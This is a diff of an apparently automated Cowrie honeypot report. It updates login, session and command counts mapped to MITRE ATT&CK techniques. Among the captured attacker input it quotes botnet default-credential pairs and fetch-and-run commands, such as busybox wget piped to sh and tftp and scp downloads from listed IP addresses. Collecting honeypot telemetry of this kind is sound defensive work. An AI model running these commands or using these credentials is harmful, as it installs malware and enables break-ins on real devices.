@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-27 15:00:35",
+  "generated": "2026-08-27 16:03:45",
   "totals": {
-    "commands": 405,
-    "login_failed": 1985,
-    "login_success": 104,
-    "sessions": 2150
+    "commands": 428,
+    "login_failed": 1995,
+    "login_success": 107,
+    "sessions": 2171
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1985,
+      "count": 1995,
       "examples": [
         "root / zlxx.",
         "root / root",
@@ -21,14 +21,14 @@
         "root / vizxv"
       ],
       "first": "2026-08-27T00:04:34.466347Z",
-      "last": "2026-08-27T14:54:07.459288Z",
-      "unique_ips": 175
+      "last": "2026-08-27T15:54:44.400591Z",
+      "unique_ips": 178
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 104,
+      "count": 107,
       "examples": [
         "admin / 12345",
         "default / techsupport",
@@ -37,8 +37,8 @@
         "root / taZz@01"
       ],
       "first": "2026-08-27T00:03:05.692337Z",
-      "last": "2026-08-27T14:27:37.187292Z",
-      "unique_ips": 85
+      "last": "2026-08-27T15:22:49.921047Z",
+      "unique_ips": 87
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 49,
+      "count": 60,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
@@ -69,8 +69,8 @@
         "http://185.93.89.72/wget"
       ],
       "first": "2026-08-27T00:20:02.855145Z",
-      "last": "2026-08-27T11:33:26.733020Z",
-      "unique_ips": 14
+      "last": "2026-08-27T15:23:06.534005Z",
+      "unique_ips": 15
     },
     {
       "id": "T1033",
@@ -206,42 +206,42 @@
   "unmapped": [
     [
       "shell",
-      26
+      27
     ],
     [
       "sh",
-      26
+      27
+    ],
+    [
+      "/bin/busybox",
+      27
     ],
     [
       "system",
-      25
+      26
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       24
     ],
     [
-      "/bin/busybox",
-      24
-    ],
-    [
       "enable",
-      17
+      18
     ],
     [
       "linuxshell",
-      12
+      14
     ],
     [
       "ping ;sh",
       10
     ],
     [
-      "enablelinuxshell",
-      9
+      "cd /proc && cat self/cmdline",
+      10
     ],
     [
-      "cd /proc && cat self/cmdline",
+      "enablelinuxshell",
       9
     ],
     [
